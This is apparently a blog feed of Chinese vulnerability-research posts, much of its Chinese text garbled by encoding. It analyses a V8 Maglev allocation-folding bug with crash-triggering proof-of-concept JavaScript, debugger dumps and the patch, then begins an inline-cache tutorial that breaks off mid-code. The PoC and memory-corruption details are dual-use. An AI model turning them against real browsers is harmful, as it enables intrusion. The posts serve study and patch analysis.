class="code"><pre><span class="line">$ ./out/debug/d8 --allow-natives-syntax --trace-maglev-graph-building poc3.js | grep Allocate</span><br><span class="line">  0x558b7953c3e8  n11: AllocateRaw(Young, 12) â†’ (x), 0 uses</span><br><span class="line">$ ./out/debug/d8 --allow-natives-syntax --trace-maglev-graph-building poc3.js | grep Folded</span><br><span class="line">  0x56273f7aa288  n17: FoldedAllocation(+12) [n11:(x)] â†’ (x), 0 uses</span><br><span class="line">  0x56273f7aa4f0  n23: FoldedAllocation(+28) [n11:(x)] â†’ (x), 0 uses</span><br><span class="line">  * Recording context slot store n28[16]: FoldedAllocation(+28) [n11:(x)] â†’ (x), 6 uses</span><br></pre></td></tr></table></figure></div><blockquote><p>ç¬¬ä¸€ä¸ª12å¯¹åº”äº†bè¿™ä¸ªBç±»çš„å®ä¾‹ï¼Œ+12å’Œ+28åˆ†åˆ«å¯¹åº”aè¿™ä¸ªJSArrayå’Œå®ƒçš„element(FixedArray),å› æ­¤aä¸€å…±å äº†32å­—èŠ‚ï¼Œæœ€ç»ˆä¸€èµ·åˆ†é…12+32&#x3D;44å­—èŠ‚</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">d8 --allow-natives-syntax --print-maglev-graph poc3.js | grep Allocate</span></span><br><span class="line">  12/11: AllocateRaw(Young, 44) â†’ [rdi|R|t] (spilled: [stack:1|t]), live range: [12-31]</span><br></pre></td></tr></table></figure></div></blockquote><p>ä¹‹åè¿›è¡Œä¸€ç‚¹ä¿®æ”¹ï¼Œå°†æ•°ç»„èµ‹å€¼æ”¹æˆè§¦å‘gcï¼Œå¹¶æ‰“å°bçš„ä¿¡æ¯</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x;</span><br><span class="line"><span class="keyword">let</span> a;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_ inherited__">A</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        x = <span class="keyword">new</span>.<span class="property">target</span>; <span class="comment">//å°†æ­£åœ¨æ„é€ çš„ç±»çš„å¼•ç”¨èµ‹å€¼ç»™x</span></span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">        <span class="title function_">gc</span>();</span><br><span class="line">        <span class="comment">//a = [1.1];</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">% <span class="title class_">PrepareFunctionForOptimization</span>(B);</span><br><span class="line"><span class="keyword">new</span> <span class="title function_">B</span>();</span><br><span class="line">% <span class="title class_">OptimizeMaglevOnNextCall</span>(B);</span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> <span class="title function_">B</span>();</span><br><span class="line">%<span class="title class_">DebugPrint</span>(b);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div><p>è¿›è¡Œè°ƒè¯•</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gdb --args out/x64.release/d8 --allow-natives-syntax --expose-gc poc4.js</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/20wx 0x36eb002c2219-1</span></span><br><span class="line">0x36eb002c2218:0x0019afe5(Map*)0x000006cd(Properties*)0x000006cd(elements*)0x00000919</span><br><span class="line">0x36eb002c2228:0x0007bbb80x000000000x000000000x00000000</span><br><span class="line">0x36eb002c2238:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x36eb002c2248:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x36eb002c2258:0x000000000x000000000x000000000x00000000</span><br></pre></td></tr></table></figure></div><blockquote><p>ä»0x00000919 å¼€å§‹æ˜¯è¿˜æœªåˆå§‹åŒ–çš„å†…å­˜</p></blockquote><h4 id="Allocation-after-garbage-collection"><a href="#Allocation-after-garbage-collection" class="headerlink" title="Allocation after garbage collection"></a>Allocation after garbage collection</h4><p>å°†æ•°ç»„èµ‹å€¼åŠ å›å»ï¼ŒåŒæ—¶ä½¿ç”¨ç©ºçš„evalè¯­å¥ä»FreeSpaceä¸­åˆ†é…å†…å­˜</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_ inherited__">A</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        x = <span class="keyword">new</span>.<span class="property">target</span>;</span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">        <span class="title function_">gc</span>();</span><br><span class="line">        <span class="keyword">let</span> a = [<span class="number">1.1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">% <span class="title class_">PrepareFunctionForOptimization</span>(B);</span><br><span class="line"><span class="keyword">new</span> <span class="title function_">B</span>();</span><br><span class="line">% <span class="title class_">OptimizeMaglevOnNextCall</span>(B);</span><br><span class="line"><span class="keyword">new</span> <span class="title function_">B</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;&#x27;</span>); <span class="comment">// allocate from FreeSpace</span></span><br></pre></td></tr></table></figure></div><p>æ­¤æ—¶è¿è¡Œå°±ä¼šè§¦å‘Fatal errorï¼Œé”™è¯¯å‘ç”Ÿåœ¨<code>FreeSpace::IsValid()</code>å‡½æ•°ä¸­ã€‚é—®é¢˜å‡ºç°åœ¨<code>free-space-inl.h</code>æ–‡ä»¶ä¸­çš„ä¸€ä¸ªæ£€æŸ¥æœªé€šè¿‡ï¼Œè¯¥æ£€æŸ¥æ¡ä»¶ä¸ºï¼š</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!heap-&gt;<span class="built_in">deserialization_complete</span>() || <span class="built_in">map_slot</span>().<span class="built_in">contains_map_value</span>(free_space_map.<span class="built_in">ptr</span>())</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20250528192652872.png"                      alt="image-20250528192652872"                ><figcaption>image-20250528192652872</figcaption></figure></p><blockquote><p>gc()ä¼š</p><ul><li>è§¦å‘åƒåœ¾å›æ”¶ï¼Œå¯èƒ½æ¸…ç†æ‰ä¹‹å‰åˆ†é…çš„å¯¹è±¡ï¼Œè…¾å‡ºFreeSpaceç©ºé—´ã€‚</li><li>å¦‚æœæ°å¥½æœ‰ä¹‹å‰æ„é€ çš„å¯¹è±¡è¢«é‡Šæ”¾ï¼Œå®ƒä»¬çš„ç©ºé—´å°†å˜ä¸ºFreeSpaceã€‚</li></ul></blockquote><h4 id="Overwriting-a-FreeSpace-object"><a href="#Overwriting-a-FreeSpace-object" class="headerlink" title="Overwriting a FreeSpace object"></a>Overwriting a FreeSpace object</h4><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">minor_gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x10000</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x;</span><br><span class="line"><span class="keyword">let</span> a;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_ inherited__">A</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        x = <span class="keyword">new</span>.<span class="property">target</span>;</span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">        <span class="title function_">minor_gc</span>();<span class="comment">//è§¦å‘æ–°ç”Ÿä»£åƒåœ¾å›æ”¶</span></span><br><span class="line">        a = [<span class="number">1.1</span>]; <span class="comment">// overwrite FreeSpace object</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123; <span class="keyword">new</span> <span class="title function_">B</span>(); &#125; <span class="comment">// optimization</span></span><br></pre></td></tr></table></figure></div><blockquote><p>æœ€åé€šè¿‡é‡å¤è°ƒç”¨Bçš„æ„é€ å‡½æ•°</p><ol><li>è§¦å‘Maglevçš„ä¼˜åŒ–æœºåˆ¶ï¼Œè®©Bçš„æ„é€ å‡½æ•°è¢«å†…è”ä¼˜åŒ–ã€‚</li><li>åˆ¶é€ å †ä¸Šçš„å†…å­˜ç¢ç‰‡å’Œå¤æ‚çš„åˆ†é…è¡Œä¸ºï¼Œæé«˜è¦†ç›– FreeSpace çš„æ¦‚ç‡ã€‚</li></ol></blockquote><p>å› æ­¤è¿è¡Œä¼šå‘ç°ï¼Œåœ¨ç»è¿‡äº†å‡ ç§’åï¼Œä¼šæœ‰ä¸€æ¬¡æˆåŠŸè¦†ç›–ï¼Œè§¦å‘<code>SEGV_ACCERR</code>è¡¨ç¤ºéæ³•è®¿é—®</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20250528195625190.png"                      alt="image-20250528195625190"                ><figcaption>image-20250528195625190</figcaption></figure></p><p>ä¸»è¦åŸå› å…¶å®æ˜¯Maglev åœ¨æ„å»ºå¯¹è±¡åˆ†é…æ—¶ï¼ˆ<code>VisitFindNonDefaultConstructorOrConstruct</code>ï¼‰ï¼Œæ²¡æœ‰åˆå§‹åŒ–<code>current_raw_allocation_</code> </p><ul><li><code>current_raw_allocation_</code>: å½“å‰æ­£åœ¨ä½¿ç”¨çš„è¿ç»­åˆ†é…å†…å­˜å—</li></ul><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* src/maglev/maglev-graph-builder.cc:8520 */</span></span><br><span class="line"><span class="function">ValueNode* <span class="title">MaglevGraphBuilder::ExtendOrReallocateCurrentRawAllocation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span> size, AllocationType allocation_type)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!current_raw_allocation_ ||</span><br><span class="line">      current_raw_allocation_-&gt;<span class="built_in">allocation_type</span>() != allocation_type ||</span><br><span class="line">      !v8_flags.inline_new) &#123;</span><br><span class="line">    current_raw_allocation_ =</span><br><span class="line">        <span class="built_in">AddNewNode</span>&lt;AllocateRaw&gt;(&#123;&#125;, allocation_type, size);</span><br><span class="line">    <span class="keyword">return</span> current_raw_allocation_;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> current_size = current_raw_allocation_-&gt;<span class="built_in">size</span>();</span><br><span class="line">  <span class="keyword">if</span> (current_size + size &gt; kMaxRegularHeapObjectSize) &#123;</span><br><span class="line">    <span class="keyword">return</span> current_raw_allocation_ =</span><br><span class="line">               <span class="built_in">AddNewNode</span>&lt;AllocateRaw&gt;(&#123;&#125;, allocation_type, size);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">DCHECK_GT</span>(current_size, <span class="number">0</span>);</span><br><span class="line">  <span class="type">int</span> previous_end = current_size;</span><br><span class="line">  current_raw_allocation_-&gt;<span class="built_in">extend</span>(size);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">AddNewNode</span>&lt;FoldedAllocation&gt;(&#123;current_raw_allocation_&#125;, previous_end);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20250528200614647.png"                      alt="image-20250528200614647"                ><figcaption>image-20250528200614647</figcaption></figure></p><blockquote><ol><li>V8é¦–å…ˆå°†æºä»£ç è½¬æˆASTï¼Œ<code>super();</code>ä¼šè¢«è½¬æ¢æˆSuperç±»å‹çš„callèŠ‚ç‚¹</li><li>è§£é‡Šå™¨è§£é‡ŠcallèŠ‚ç‚¹æ—¶ä¼šè°ƒç”¨<code>VisitCall</code>ï¼Œè€Œå¯¹äºSuperç±»å‹çš„callèŠ‚ç‚¹ï¼Œä¼šç»§ç»­è°ƒç”¨<code>VisitCallSuper</code>ï¼Œæœ€ç»ˆä¼šæ‰§è¡Œ<code>FindNonDefaultConstructorOrContruct</code>æŒ‡ä»¤</li><li>ç”±äº<code>for (let i = 0; i &lt; 1000; i++) &#123; new B(); &#125; </code> å› æ­¤<code>super();</code>ä¼šè¢«JITè¯†åˆ«æˆhot codeï¼ŒMaglevå¼€å§‹ä¼˜åŒ–ï¼Œå¤„ç†<code>FindNonDefaultConstructorOrContruct</code>æŒ‡ä»¤æ—¶ä¼šè°ƒç”¨<code>VisitFindNonDefaultConstructorOrConstruct</code>å‡½æ•°</li><li>è€Œå¦‚æœæ°å¥½åœ¨ä¸Šå›¾ç”¨<code>VisitFindNonDefaultConstructorOrConstruct</code>å‡½æ•°çš„[1]å¤„å‘ç”Ÿäº†gcï¼Œæ­¤æ—¶åˆ›å»ºçš„Bç±»å®ä¾‹ä¼šè¢«ç§»åŠ¨åˆ°è€å¹´ä»£ï¼Œä½†æ˜¯<code>current_raw_allocation_</code>è¿˜æŒ‡å‘æ—§çš„å†…å­˜ç©ºé—´ï¼ˆæ­¤æ—¶å˜æˆFreeSpaceï¼‰ï¼Œè€Œç”±äºMaglevçš„åˆ†é…æŠ˜å ä¼˜åŒ–ï¼Œä¼šæ¥ç€å‘è¿™æ®µFreeSpaceå†™å…¥æ•°ç»„[1.1]ï¼Œå¼•å‘äº†<code>SEGV_ACCERR</code></li></ol></blockquote><h3 id="Patchåˆ†æ"><a href="#Patchåˆ†æ" class="headerlink" title="Patchåˆ†æ"></a>Patchåˆ†æ</h3><div class="highlight-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@@ -5597,6 +5597,7 @@</span></span><br><span class="line">           object = BuildAllocateFastObject(</span><br><span class="line">               FastObject(new_target_function-&gt;AsJSFunction(), zone(), broker()),</span><br><span class="line">               AllocationType::kYoung);</span><br><span class="line"><span class="addition">+          ClearCurrentRawAllocation();</span></span><br><span class="line">         &#125; else &#123;</span><br><span class="line">           object = BuildCallBuiltin&lt;Builtin::kFastNewObject&gt;(</span><br><span class="line">               &#123;GetConstant(current_function), new_target&#125;);</span><br></pre></td></tr></table></figure></div><p>patchåªæ·»åŠ äº†ä¸€è¡Œï¼Œåœ¨<code>BuildAllocateFastObject()</code>ä¹‹åç«‹å³è°ƒç”¨<code>ClearCurrentRawAllocation()</code>ï¼Œè®©<code>current_raw_allocation_</code>è¢«é‡ç½®æˆ–æ¸…é™¤ï¼Œé˜²æ­¢å› ä¸ºåˆ†é…æŠ˜å ä¼˜åŒ–è€Œæ¥ç€åœ¨åç»­FreeSpaceä¸­å†™å…¥æ•°æ®ã€‚</p><h2 id="0x03-æ¼æ´åˆ©ç”¨"><a href="#0x03-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x03 æ¼æ´åˆ©ç”¨"></a>0x03 æ¼æ´åˆ©ç”¨</h2><p>TODOâ€¦ğŸ‘©ğŸ»â€ğŸ’»</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a class="link"   href="https://www.vicarius.io/vsociety/posts/out-of-bound-write-in-v8-javascript-engine-cve-2024-0517" >https://www.vicarius.io/vsociety/posts/out-of-bound-write-in-v8-javascript-engine-cve-2024-0517 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://bnovkebin.github.io/blog/CVE-2024-0517/" >https://bnovkebin.github.io/blog/CVE-2024-0517/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://research.qianxin.com/archives/2720" >https://research.qianxin.com/archives/2720 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit?tab=t.0" >https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit?tab=t.0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> JIT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js-engine </tag>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V8-pwnå…¥é—¨(3)â€”â€”Inline-Cacheã€GCã€JIT</title>
      <link href="/2024/11/17/V8-pwn%E5%85%A5%E9%97%A8-3-%E2%80%94%E2%80%94Inline-Cache%E3%80%81GC%E3%80%81JIT/"/>
      <url>/2024/11/17/V8-pwn%E5%85%A5%E9%97%A8-3-%E2%80%94%E2%80%94Inline-Cache%E3%80%81GC%E3%80%81JIT/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Inline-CacheğŸ—ºï¸"><a href="#0x00-Inline-CacheğŸ—ºï¸" class="headerlink" title="0x00 Inline CacheğŸ—ºï¸"></a>0x00 Inline CacheğŸ—ºï¸</h2><h3 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h3><p>Inline Cache æ˜¯ä¸€ç§åŸºäºå†å²è®¿é—®æ¨¡å¼çš„ç¼“å­˜æŠ€æœ¯ï¼Œä¸»è¦ç”¨äºåŠ é€Ÿä»¥ä¸‹æ“ä½œï¼š</p><ul><li><strong>å±æ€§è®¿é—®</strong>ï¼ˆå¦‚ <code>obj.prop</code>ï¼‰</li><li><strong>æ–¹æ³•è°ƒç”¨</strong>ï¼ˆå¦‚ <code>obj.method()</code>ï¼‰</li><li><strong>å±æ€§è®¾ç½®</strong>ï¼ˆå¦‚ <code>obj.prop = value</code>ï¼‰</li><li><strong>å…¨å±€å˜é‡è®¿é—®</strong></li></ul><p>é‚£ä¹ˆè¿™ç§ç¼“å­˜æ˜¯æ€ä¹ˆå®ç°çš„ï¼ŸğŸ¤”å…¶å®å°±æ˜¯ä¹‹å‰æåˆ°çš„Hidden Class(ä¹Ÿå°±æ˜¯Map)ï¼Œä»¥å±æ€§è®¿é—®ä¸ºä¾‹ï¼Œå¯¹äºä¸€ä¸ªobjçš„mapï¼Œå¦‚æœæƒ³è®¿é—®<code>obj.X</code>ï¼Œæˆ‘ä»¬å¯ä»¥ç¼“å­˜objçš„Mapï¼Œè€Œ<code>obj.X</code>ä½œä¸ºä¸€ä¸ªname propertyåœ¨Mapä¸­properties arrayçš„åç§»æ˜¯å›ºå®šçš„ï¼Œå› æ­¤å¯ä»¥ç›´æ¥å–å‡ºï¼Œä¸ç”¨å†ç”¨<code>X</code>è¿™ä¸ªkeyå»Mapä¸­çš„properties arrayæ£€ç´¢ï¼Œä»è€ŒåŠ é€Ÿå±æ€§è®¿é—®</p><h3 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h3><ul><li>0 uninitializedï¼šæœªåˆå§‹åŒ–</li><li>. premonomorphicï¼šå•æ€ä¹‹å‰</li><li>1 monomorphicï¼šå•æ€</li><li>^ recompute handlerï¼šé‡æ–°è®¡ç®—å¤„ç†å™¨</li><li>P polymorphicï¼šå¤šæ€</li><li>N megamorphicï¼šå·¨å‹ç¼“å­˜çŠ¶æ€</li><li>G genericï¼šé€šç”¨</li></ul><h3 id="åŸºæœ¬è¿‡ç¨‹"><a href="#åŸºæœ¬è¿‡ç¨‹" class="headerlink" title="åŸºæœ¬è¿‡ç¨‹"></a>åŸºæœ¬è¿‡ç¨‹</h3><p>å…·ä½“å¯å‚è€ƒ<a class="link"   href="https://mp.weixin.qq.com/s/mbJJAiGz0OAd2IOc8K5Mkg" >https://mp.weixin.qq.com/s/mbJJAiGz0OAd2IOc8K5Mkg <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>?</p><p>ç®€å•æ¥è¯´ï¼Œåªæœ‰åœ¨ç¬¬äºŒæ¬¡è®¿é—®<code>obj.X</code>æ—¶ï¼ˆç¬¬äºŒæ¬¡äº§ç”ŸIC-Missï¼‰ï¼Œä¼šç¼–è¯‘ç”Ÿæˆ<code>IC-Hit Handler</code>ï¼ŒæŠŠ<code>IC-Hit Handler</code>å’Œ<code>Map</code>åŠ å…¥ç¼“å­˜ï¼Œä¹‹åç¬¬ä¸‰æ¬¡è®¿é—®<code>obj.X</code>é€Ÿåº¦ä¼šå¤§å¤§æå‡ã€‚</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241117180023224.png"                      alt="image-20241117180023224"                ><figcaption>image-20241117180023224</figcaption></figure></p><h3 id="Monomorphic-å•æ€ï¼‰"><a href="#Monomorphic-å•æ€ï¼‰" class="headerlink" title="Monomorphic(å•æ€ï¼‰"></a>Monomorphic(å•æ€ï¼‰</h3><p>æ­¤æ—¶éœ€è¦ç¼“å­˜çš„åªæœ‰ä¸€ç§mapï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªobjectè¢«å®šä¹‰åï¼Œä¸ä¼šæ·»åŠ &#x2F;åˆ é™¤propertyï¼Œä¹Ÿå°±ä¸ä¼šæ”¹å˜Hidden Class(Map)</p><p>ä¸¾ä¸ªä¾‹å­ğŸŒ°</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ©ç”¨--print-bytecodeå¯ä»¥çœ‹å­—èŠ‚ç </span></span><br><span class="line"><span class="keyword">let</span> o = &#123;sloth : <span class="number">1440</span>&#125;;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getSloth</span>(<span class="params">obj</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> obj.<span class="property">sloth</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)<span class="comment">//è§¦å‘inline Cache</span></span><br><span class="line"><span class="title function_">getSloth</span>(o);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(getSloth);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line">[generated bytecode <span class="keyword">for</span> <span class="attr">function</span>: getSloth]</span><br><span class="line"><span class="title class_">Parameter</span> count <span class="number">2</span></span><br><span class="line"><span class="title class_">Register</span> count <span class="number">0</span></span><br><span class="line"><span class="title class_">Frame</span> size <span class="number">0</span></span><br><span class="line">   <span class="number">41</span> E&gt; <span class="number">0x1ebf58a1fb42</span> @    <span class="number">0</span> : a5                <span class="title class_">StackCheck</span></span><br><span class="line">   <span class="number">61</span> S&gt; <span class="number">0x1ebf58a1fb43</span> @    <span class="number">1</span> : <span class="number">28</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       <span class="title class_">LdaNamedProperty</span> a0, [<span class="number">0</span>], [<span class="number">0</span>]</span><br><span class="line">   <span class="number">67</span> S&gt; <span class="number">0x1ebf58a1fb47</span> @    <span class="number">5</span> : a9                <span class="title class_">Return</span></span><br><span class="line"><span class="title class_">Constant</span> <span class="title function_">pool</span> (size = <span class="number">1</span>)</span><br><span class="line"><span class="number">0x1ebf58a1faf1</span>: [<span class="title class_">FixedArray</span>] <span class="keyword">in</span> <span class="title class_">OldSpace</span></span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x336a62180801</span> &lt;<span class="title class_">Map</span>&gt;</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">1</span></span><br><span class="line">           <span class="number">0</span>: <span class="number">0x1ebf58a1f229</span> &lt;<span class="title class_">String</span>[#<span class="number">5</span>]: sloth&gt;</span><br><span class="line"><span class="title class_">Handler</span> <span class="title class_">Table</span> (size = <span class="number">0</span>)</span><br><span class="line"><span class="number">0x1ebf58a1f611</span> &lt;<span class="title class_">JSFunction</span> <span class="title function_">getSloth</span> (sfi = <span class="number">0x1ebf58a1f371</span>)&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>å¯ä»¥çœ‹åˆ°ç”Ÿæˆçš„å­—èŠ‚ç å¾ˆç®€å•ï¼Œå°±æ˜¯ç”¨ä¸€ä¸ª<code>LdaNamedProperty</code></p><p>åœ¨V8æºç src&#x2F;interpreter&#x2F;interpreter-gengerator.ccæœ‰è§£é‡Š<code>LdaNamedProperty</code>çš„ä½¿ç”¨è§„èŒƒ</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LdaNamedProperty &lt;object&gt; &lt;name_index&gt; &lt;slot&gt;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Calls the LoadIC at FeedBackVector slot &lt;slot&gt; for &lt;object&gt; and the name at</span></span><br><span class="line"><span class="comment">// constant pool entry &lt;name_index&gt;.</span></span><br></pre></td></tr></table></figure></div><p>å…·ä½“æ¥è¯´ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯è¦è®¿é—®çš„objectï¼Œç¬¬äºŒä¸ªæ˜¯name objectçš„nameåœ¨å¸¸é‡æ± ä¸­çš„indexï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¸ªslotï¼Œä¸»è¦æ˜¯æŒ‡æ˜è°ƒç”¨<code> FeedBackVector</code>ä¸­çš„å“ªä¸ªLoadIC</p><p>æˆ‘ä»¬å¯ä»¥è·Ÿè¿›ä¸€ä¸‹çœ‹çœ‹è¿™ä¸ª<code>FeedBackVector</code></p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 